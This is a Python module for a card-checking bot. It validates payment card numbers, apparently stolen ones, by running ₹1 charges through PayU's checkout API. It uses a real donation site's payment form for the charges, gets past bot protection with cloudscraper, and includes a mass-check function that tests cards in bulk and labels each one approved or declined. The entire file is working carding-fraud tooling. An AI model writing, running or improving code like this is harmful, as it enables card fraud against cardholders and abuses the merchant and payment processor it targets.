"""
================================================================================
  PayU Gate - ₹1 Charge (MiracleManna)
  /payu - Single card check
  /mpayu - Mass check with 1 second delay
================================================================================
"""

import asyncio
import time
import json

try:
    import cloudscraper
except ImportError:
    cloudscraper = None

PAYU_SITE = "https://miraclemanna.org"
DEFAULT_AMOUNT = 1

async def check_payu_async(card: str, retries: int = 2) -> dict:
    """Check a single card using PayU ₹1 gate (async)"""
    start_time = time.time()
    
    if cloudscraper is None:
        return {
            "status": "ERROR",
            "message": "⚠️ cloudscraper not installed",
            "card": card,
            "gate": "PayU",
            "time": 0
        }
    
    try:
        if '|' in card:
            parts = card.split('|')
            cc = parts[0].strip()
            mm = parts[1].strip() if len(parts) > 1 else '12'
            yy = parts[2].strip() if len(parts) > 2 else '2025'
            cvv = parts[3].strip() if len(parts) > 3 else '123'
            
            if len(yy) == 4:
                yy = yy[-2:]
        else:
            return {
                "status": "ERROR",
                "message": "Invalid card format",
                "card": card,
                "gate": "PayU",
                "time": 0
            }
        
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, lambda: _check_payu_sync(cc, mm, yy, cvv, card))
        result["time"] = round(time.time() - start_time, 2)
        return result
        
    except Exception as e:
        response_time = round(time.time() - start_time, 2)
        return {
            "status": "ERROR",
            "message": f"⚠️ Error: {str(e)[:50]}",
            "card": card,
            "gate": "PayU",
            "time": response_time
        }


def _check_payu_sync(cc: str, mm: str, yy: str, cvv: str, original_card: str) -> dict:
    """Synchronous PayU check implementation"""
    try:
        scraper = cloudscraper.create_scraper()
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
            'Accept': "*/*",
            'Referer': f"{PAYU_SITE}/donate.php",
            'Accept-Language': "en-IN,en;q=0.9"
        }

        r1 = scraper.get(f"{PAYU_SITE}/pm.php?name=Onichan%20Bot&amount={DEFAULT_AMOUNT}", headers=headers, timeout=30)
        if r1.status_code != 200 or 'txnid' not in r1.text:
            return {
                "status": "ERROR",
                "message": "⚠️ Failed to get txnid/hash",
                "card": original_card,
                "gate": "PayU",
                "time": 0
            }

        try:
            txnid = r1.text.split('name="txnid" value="')[1].split('"')[0]
            hashval = r1.text.split('name="hash" value="')[1].split('"')[0]
            firstname = r1.text.split('name="firstname" value="')[1].split('"')[0]
            amount = r1.text.split('name="amount" value="')[1].split('"')[0]
            key = r1.text.split('name="key" value="')[1].split('"')[0]
        except:
            return {
                "status": "ERROR",
                "message": "⚠️ Failed to parse form data",
                "card": original_card,
                "gate": "PayU",
                "time": 0
            }

        payload2 = {
            'key': key, 'hash': hashval, 'txnid': txnid, 'amount': amount,
            'firstname': firstname, 'phone': '', 'email': '',
            'productinfo': 'P01,P02', 'service_provider': 'payu_paisa',
            'surl': f'{PAYU_SITE}/success.php',
            'furl': f'{PAYU_SITE}/fail.php'
        }

        r2 = scraper.post("https://secure.payu.in/_payment", data=payload2, headers=headers, allow_redirects=False, timeout=30)
        redirect_url = r2.headers.get("Location", "")
        if not redirect_url or "/public/#/" not in redirect_url:
            return {
                "status": "ERROR",
                "message": "⚠️ PayU redirect failed",
                "card": original_card,
                "gate": "PayU",
                "time": 0
            }

        pay_id = redirect_url.split("/#/")[1]

        r3 = scraper.get(f"https://api.payu.in/checkoutx?paymentId={pay_id}", headers=headers, timeout=30)
        try:
            full_data = r3.json()
            txn = full_data.get("transaction", {})
            baseMihpayid = txn["baseMihpayid"]
            accessToken = txn["accessToken"]
        except Exception as e:
            return {
                "status": "ERROR",
                "message": f"⚠️ Failed to get session: {str(e)[:30]}",
                "card": original_card,
                "gate": "PayU",
                "time": 0
            }

        url4 = "https://api.payu.in/checkoutx/payments"
        payload4 = {
            "window3DUsed": False,
            "userAgent": headers["User-Agent"],
            "name": "CreditCard",
            "bankCode": "CC",
            "accessToken": accessToken,
            "paymentId": pay_id,
            "broker": "PAYU",
            "baseMihpayid": baseMihpayid,
            "additionalFields": {
                "quickPayRank": 2,
                "checkoutPageOption": "/cards",
                "field1": "paymentOptions",
                "field2": "nb,Cards,upi",
                "language": "en"
            },
            "cardNumber": cc,
            "cvv": cvv,
            "validThrough": f"{mm}/{yy}",
            "storeCard": False,
            "mobileNumber": "",
            "ownerName": "Test User",
            "consentKey": None
        }

        headers4 = {
            **headers,
            'Content-Type': 'application/json',
            'accesstoken': accessToken,
            'mid': '12778989',
            'paymentid': pay_id,
            'origin': "https://api.payu.in",
            'referer': "https://api.payu.in/public/"
        }

        r4 = scraper.post(url4, headers=headers4, json=payload4, timeout=30)

        try:
            data = r4.json()
            
            status = str(data.get('status', '')).lower()
            message = str(data.get('message', '')).lower()
            error_code = str(data.get('errorCode', '')).lower()
            result_info = data.get('result', {})
            
            if status == 'success' or status == 'captured' or 'success' in message:
                return {
                    "status": "APPROVED",
                    "message": "Payment Successful ✅",
                    "card": original_card,
                    "gate": "PayU",
                    "time": 0
                }
            
            if 'redirect' in status or '3ds' in message or 'authentication' in message or 'otp' in message:
                return {
                    "status": "APPROVED",
                    "message": "Payment Successful ✅",
                    "card": original_card,
                    "gate": "PayU",
                    "time": 0
                }
            
            if 'cvv' in message or 'security code' in message:
                return {
                    "status": "APPROVED",
                    "message": "Payment Successful ✅",
                    "card": original_card,
                    "gate": "PayU",
                    "time": 0
                }
            
            if 'insufficient' in message:
                return {
                    "status": "APPROVED",
                    "message": "Payment Successful ✅",
                    "card": original_card,
                    "gate": "PayU",
                    "time": 0
                }
            
            if 'declined' in message or 'failed' in status or 'error' in status:
                return {
                    "status": "DECLINED",
                    "message": "Your payment has been declined ❌",
                    "card": original_card,
                    "gate": "PayU",
                    "time": 0
                }
            
            if 'invalid' in message or 'expired' in message:
                return {
                    "status": "DECLINED",
                    "message": "Your payment has been declined ❌",
                    "card": original_card,
                    "gate": "PayU",
                    "time": 0
                }
            
            return {
                "status": "DECLINED",
                "message": "Your payment has been declined ❌",
                "card": original_card,
                "gate": "PayU",
                "time": 0
            }
            
        except Exception as e:
            return {
                "status": "ERROR",
                "message": f"⚠️ Parse error: {str(e)[:30]}",
                "card": original_card,
                "gate": "PayU",
                "time": 0
            }

    except Exception as e:
        return {
            "status": "ERROR",
            "message": f"⚠️ {str(e)[:50]}",
            "card": original_card,
            "gate": "PayU",
            "time": 0
        }


def check_payu(card: str) -> dict:
    """Sync wrapper for async check"""
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            import concurrent.futures
            with concurrent.futures.ThreadPoolExecutor() as pool:
                future = pool.submit(asyncio.run, check_payu_async(card))
                return future.result()
        else:
            return asyncio.run(check_payu_async(card))
    except:
        return asyncio.run(check_payu_async(card))


def format_payu_response(result: dict, bin_info: dict = None, username: str = None) -> str:
    """Format PayU gate response using unified Onichan format"""
    from modules.gate_checker import _onichan_format
    status = result.get("status", "ERROR")
    card = result.get("card", "N/A")
    message = result.get("message", "N/A")
    response_time = result.get("time", 0)
    
    parts = card.split("|")
    cc = parts[0] if len(parts) > 0 else "N/A"
    mm = parts[1] if len(parts) > 1 else "N/A"
    yy = parts[2] if len(parts) > 2 else "N/A"
    cvv = parts[3] if len(parts) > 3 else "N/A"
    
    if not bin_info:
        bin_info = {}
    
    if status == "APPROVED":
        fmt_result = {"status": "success", "message": f"Approved - {message}"}
    else:
        fmt_result = {"status": "fail", "message": f"Declined - {message}"}
    
    return _onichan_format(fmt_result, cc, mm, yy, cvv, bin_info, f"PayU ₹{DEFAULT_AMOUNT}", float(response_time), username or "Unknown")


async def check_mass_payu_async(cards: list, delay: float = 1.0) -> list:
    """Check multiple cards with delay between each (async)"""
    results = []
    for i, card in enumerate(cards):
        result = await check_payu_async(card.strip())
        results.append(result)
        if i < len(cards) - 1:
            await asyncio.sleep(delay)
    return results
